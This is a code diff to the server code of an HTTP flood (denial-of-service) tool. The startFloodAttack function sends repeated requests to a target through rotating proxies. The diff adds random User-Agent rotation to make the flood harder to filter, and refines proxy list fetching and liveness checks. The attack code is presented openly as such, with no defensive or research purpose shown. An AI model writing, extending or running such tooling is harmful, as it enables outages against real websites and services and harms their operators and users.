@@ -2,6 +2,7 @@
 "use server";
 
 import { HttpsProxyAgent } from "https-proxy-agent";
+import { USER_AGENTS } from "@/lib/user-agents";
 
 export interface FloodStats {
   totalSent: number;
@@ -46,6 +47,7 @@ export async function startFloodAttack(
   }
 
   const parsedHeaders: HeadersInit = {};
+  let customUserAgentProvided = false;
   if (headersString) {
     headersString.split('\n').forEach(line => {
       const parts = line.split(':');
@@ -54,6 +56,9 @@ export async function startFloodAttack(
         const value = parts.slice(1).join(':').trim();
         if (key && value) {
           parsedHeaders[key] = value;
+          if (key.toLowerCase() === 'user-agent') {
+            customUserAgentProvided = true;
+          }
         }
       }
     });
@@ -61,21 +66,22 @@ export async function startFloodAttack(
 
   const baseFetchOptions: RequestInit = {
     method: method.toUpperCase(),
-    headers: parsedHeaders,
+    // Headers will be set per request to allow User-Agent rotation
     signal: AbortSignal.timeout(5000) 
   };
 
   if (body && !METHODS_WITHOUT_BODY.includes(method.toUpperCase())) {
     baseFetchOptions.body = body;
     
-    if (!parsedHeaders['Content-Type'] && !parsedHeaders['content-type']) {
+    // Set Content-Type only if not already provided in custom headers
+    const hasContentType = Object.keys(parsedHeaders).some(key => key.toLowerCase() === 'content-type');
+    if (!hasContentType) {
         try {
             JSON.parse(body);
             parsedHeaders['Content-Type'] = 'application/json';
         } catch (e) {
             parsedHeaders['Content-Type'] = 'text/plain';
         }
-        baseFetchOptions.headers = parsedHeaders; 
     }
   }
 
@@ -84,7 +90,7 @@ export async function startFloodAttack(
     parsedProxies = proxiesString
       .split('\n')
       .map(line => line.trim())
-      .filter(line => line.length > 0);
+      .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://"));
 
     if (parsedProxies.length === 0 && proxiesString.trim().length > 0) {
         return { totalSent: 0, successful: 0, failed: 0, error: "No valid proxy strings could be parsed. Check format (e.g., host:port or IP:PORT)." };
@@ -111,9 +117,20 @@ export async function startFloodAttack(
         if (Date.now() >= endTime) break;
 
         let currentFetchOptions = { ...baseFetchOptions };
+        const currentHeaders = {...parsedHeaders};
+
+        // User-Agent rotation
+        if (!customUserAgentProvided && USER_AGENTS.length > 0) {
+            currentHeaders['User-Agent'] = USER_AGENTS[Math.floor(Math.random() * USER_AGENTS.length)];
+        }
+        currentFetchOptions.headers = currentHeaders;
+
+
         if (parsedProxies.length > 0) {
           const proxyConfig = parsedProxies[totalSent % parsedProxies.length];
           try {
+            // HttpsProxyAgent expects the proxy string in host:port format,
+            // or user:pass@host:port. It handles http:// prefix internally if needed for CONNECT.
             const agent = new HttpsProxyAgent(proxyConfig); 
             currentFetchOptions.agent = agent as any; 
           } catch (e) {
@@ -187,10 +204,11 @@ export async function fetchProxiesFromUrl(apiUrl: string): Promise<{ proxies?: s
       return { error: "API returned an empty proxy list." };
     }
     
+    // Strip http(s):// schemes and trim lines
     const lines = text.trim().split('\n');
     const strippedLines = lines.map(line => line.trim().replace(/^(http(s)?:\/\/)/i, ''));
     
-    // Basic validation for stripped lines
+    // Basic validation for stripped lines (optional, but good for user feedback if format is unexpected)
     if (strippedLines.length === 0 || !strippedLines.some(line => /^\S+:\d+$/.test(line.trim()) || /^\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}(:\d{1,5})?$/.test(line.trim()) )) {
       // console.warn("Fetched proxy list, after stripping schemes, does not seem to contain valid IP:Port or Host:Port formats.", strippedLines.slice(0,5));
     }
@@ -216,30 +234,28 @@ export async function checkProxies(proxiesString: string): Promise<{
     return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0 };
   }
 
+  // Expect proxies in host:port or user:pass@host:port format, without schemes.
   const proxyEntries = proxiesString.split('\n')
     .map(line => line.trim())
-    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); // Ensure no schemes here
+    .filter(line => line.length > 0 && !line.startsWith("http://") && !line.startsWith("https://")); 
 
   if (proxyEntries.length === 0) {
-    // This could happen if all input proxies had schemes and were filtered out,
-    // or if the input was empty after trimming schemes.
-    // Consider if a more specific message is needed if initialProxiesString was not empty.
-    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "No proxies in the correct host:port format found to check." };
+    return { liveProxiesString: "", liveCount: 0, deadCount: 0, totalChecked: 0, error: "No proxies in the correct host:port format found to check. Ensure http(s):// schemes are removed." };
   }
 
   const liveProxiesArray: string[] = [];
   let deadCount = 0;
 
-  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { // proxyUrl is host:port
+  const checkSingleProxy = async (proxyUrl: string): Promise<boolean> => { // proxyUrl is host:port or user:pass@host:port
     try {
-      const agent = new HttpsProxyAgent(proxyUrl);
+      const agent = new HttpsProxyAgent(proxyUrl); // HttpsProxyAgent can handle user:pass@host:port
       const response = await fetch(PROXY_TEST_URL, {
         agent: agent as any,
         signal: AbortSignal.timeout(PROXY_TEST_TIMEOUT_MS),
         redirect: 'manual', 
       });
       return response.status === 204 || response.status === 200;
-    } catch (error) {
+    } catch (error: any) {
       // console.warn(`Proxy ${proxyUrl} failed check:`, error.message);
       return false;
     }
@@ -259,6 +275,9 @@ export async function checkProxies(proxiesString: string): Promise<{
           deadCount++;
         }
       } else {
+        // result.status === 'rejected' means checkSingleProxy threw an unhandled error,
+        // or the promise itself was rejected before checkSingleProxy completed.
+        // Treat as dead.
         deadCount++;
       }
     });
